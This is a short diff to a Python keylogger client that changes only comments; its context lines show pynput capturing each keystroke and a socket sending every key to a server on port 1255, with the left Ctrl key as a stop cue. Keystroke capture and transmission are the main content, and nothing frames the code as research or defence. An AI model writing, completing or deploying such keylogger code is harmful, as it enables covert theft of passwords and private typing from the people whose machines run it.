@@ -1,7 +1,7 @@
 import socket
 from pynput.keyboard import Listener
 
-#same jazz as server side.
+#same as server side.
 s_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = "127.0.0.1"
 port = 1255
@@ -19,7 +19,7 @@ def serverconnection(key):
 
 def on_press(key):
     pressed_key = str(key) #keep everything as a string to make life easier.
-    pressed_key = pressed_key.replace("'","")    #needed to get rid of them the minute I saw them.
+    pressed_key = pressed_key.replace("'","")
     serverconnection(pressed_key)    
     if pressed_key == "Key.ctrl_l": #disconnection cue.
         print("Logger terminated")    #let me know it's done.   
